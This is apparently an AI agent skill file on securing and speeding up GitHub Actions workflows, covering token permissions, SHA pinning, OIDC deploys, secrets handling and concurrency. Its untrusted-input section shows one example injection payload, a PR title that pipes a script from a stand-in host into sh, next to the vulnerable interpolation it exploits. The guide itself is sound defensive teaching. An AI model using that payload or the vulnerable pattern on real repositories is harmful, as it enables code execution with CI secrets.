---
name: github-actions
description: Use when writing, changing or reviewing a GitHub Actions workflow or reusable workflow in .github/workflows — CI checks, builds, releases, deployments, scheduled jobs — or when a workflow is slow, flaky, runs too often, leaks or needs secrets, uses pull_request_target, or fails actionlint or a security scan.
metadata:
  title: GitHub Actions
  frameworks: GitHub Actions
  summary: Least-privilege tokens, actions pinned by commit SHA, untrusted input kept out of scripts, OIDC instead of stored cloud keys, environments for deploys, and fast, cancellable, cached runs.
---

# GitHub Actions

A workflow is code that runs with your repository's credentials on every push and pull request. Review it with the same care as production code: it can leak secrets, publish packages, and deploy. Most of the risk comes from four things: broad token permissions, mutable action tags, untrusted text interpolated into shell scripts, and privileged triggers that run pull-request code.

For what the pipeline should contain (stages, gates, release strategy), see the ci-cd skill. This skill is about doing it safely and efficiently on GitHub.

## Quick reference

| Concern | Do | Instead of |
| --- | --- | --- |
| Token permissions | `permissions: contents: read` at the top; widen per job (`id-token: write`, `packages: write`) only where needed | the default token permissions, or `write-all` |
| Action versions | full commit SHA with the version in a comment (`@3d3c42e… # v7.0.1`), or the `.github/workflows/actions.lock` lockfile from `gh actions-lock`; Dependabot to bump them | `@v7`, `@main`: tags and branches can be moved to other code |
| Untrusted input | pass `${{ github.event.* }}` titles, branch names and bodies through `env:` and quote `"$VAR"` | `run: echo "${{ github.event.pull_request.title }}"`, which is script injection |
| Pull requests from forks | `pull_request` (no secrets, read-only token) | `pull_request_target` or `workflow_run` that checks out and runs the PR's code |
| Checkout | `persist-credentials: false` unless a later step pushes | leaving the token in `.git/config` for every later step |
| Cloud credentials | OIDC (`id-token: write`) with a cloud role restricted to this repo, branch and environment | long-lived access keys in repository secrets |
| Deploys | jobs with `environment: production`, with required reviewers and branch rules; secrets scoped to the environment | repository-wide deploy secrets any workflow can read |
| Wasted runs | `concurrency` that cancels superseded PR runs; `paths` filters; `timeout-minutes` on every job | 6-hour hung jobs, and five queued runs of the same PR |
| Speed | `setup-*` built-in caching (`cache: npm`); jobs that run in parallel; build once and pass artifacts | reinstalling everything in every job; rebuilding for deploy |
| Duplication | reusable workflows (`workflow_call`) and composite actions in the repo | copy-pasted jobs across workflows |
| Matrix | `fail-fast: false` for test matrices; only the versions you support | a matrix that hides which combination failed |
| Linting | `actionlint` on every change, and a security scanner (`zizmor`) | finding typos in YAML on the default branch |
| Self-hosted runners | only for private repositories, ephemeral, one job per runner | persistent runners on a public repository |

## Example: CI, then a gated, credential-less deploy

```yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read                     # every job starts read-only

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}   # never cancel a main-branch deploy

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 24
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm test
      - run: npm run build
      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
        with:
          name: dist
          path: dist/
          retention-days: 7

  deploy:
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    needs: test
    runs-on: ubuntu-latest
    timeout-minutes: 15
    environment: production          # required reviewers + environment-scoped secrets
    permissions:
      contents: read
      id-token: write                # OIDC token for the cloud role; no stored keys
      attestations: write
    steps:
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          name: dist                 # deploy exactly what was tested
          path: dist/
      - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
        with:
          subject-path: dist/**
      # Exchange the OIDC token for short-lived credentials with your cloud's official
      # login action (pinned by SHA), then deploy:
      - run: ./scripts/deploy.sh dist
        env:
          DEPLOY_ENV: production
```

## Untrusted input

Anything an outsider can set is untrusted. That includes PR titles, bodies and branch names, issue and comment text, commit messages, and artifacts produced by pull-request runs.

```yaml
# Wrong: the title is pasted into the script before the shell runs, so
#   a title like  "; curl evil.sh | sh #  runs that command
- run: echo "Checking ${{ github.event.pull_request.title }}"

# Right: the title arrives as data in an environment variable
- run: echo "Checking $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

- `pull_request_target` and `workflow_run` run with secrets and a write-capable token. Use them only for metadata work, such as labelling or commenting, and never check out or execute the pull request's code in them.
- Treat artifacts and caches written by pull-request runs as untrusted input when a privileged workflow reads them.

## Secrets

- Store secrets in environments, not at repository level, when only deploys need them. Prefer OIDC over stored cloud keys entirely.
- Never echo a secret, or something derived from it (base64, a signed token), because masking only covers the exact stored value. Register derived values as secrets, or mask them with `::add-mask::`.
- Don't store a whole JSON, YAML or `.env` file as one secret, because masking then fails on its parts. Use one secret per value.
- If a secret reaches a log, delete the log and rotate the secret. Deleting the log alone is not enough.

## Common mistakes

| Symptom | Cause | Fix |
| --- | --- | --- |
| `Resource not accessible by integration` | the job's token lacks a permission | add that one permission to that job only |
| Fork PRs fail on missing secrets | secrets aren't given to fork `pull_request` runs, by design | make the check work without secrets, or run it after merge |
| Same PR runs pile up | no `concurrency` group | `concurrency` with `cancel-in-progress` for PRs |
| Job hangs for hours | no `timeout-minutes` | set it on every job |
| Deploy ships something other than what was tested | deploy job rebuilds from source | build once, upload, then download the artifact in the deploy |
| Action suddenly behaves differently | tag moved to new code | pin by SHA or lockfile; let Dependabot raise the update as a PR |
| Workflow edit breaks on main only | YAML and expressions never linted | `actionlint` (and `zizmor`) in CI |

## References

- [Workflow syntax](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax): `on`, `permissions`, `concurrency`, `jobs`, `strategy`, `environment`
- [Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use): pinning, token permissions, script injection, privileged triggers, secrets
- [Workflow dependency lockfiles](https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles): `actions.lock` and `gh actions-lock`
- [OpenID Connect](https://docs.github.com/en/actions/concepts/security/openid-connect): short-lived cloud credentials without stored keys
- [Using secrets](https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets): repository, environment and organisation secrets
- [Managing environments](https://docs.github.com/en/actions/how-tos/deploy/configure-and-manage-deployments/manage-environments): required reviewers, branch rules, environment secrets
- [Reusing workflows](https://docs.github.com/en/actions/how-tos/reuse-automations/reuse-workflows): `workflow_call`, inputs, secrets
- [Controlling concurrency](https://docs.github.com/en/actions/how-tos/write-workflows/choose-when-workflows-run/control-workflow-concurrency): groups and `cancel-in-progress`
- [Dependency caching](https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching): cache keys, scope and limits
- [Artifact attestations](https://docs.github.com/en/actions/concepts/security/artifact-attestations): build provenance for what you ship
- [actionlint](https://github.com/rhysd/actionlint): static checks for workflow files
- [zizmor](https://github.com/zizmorcore/zizmor): security audit for workflows
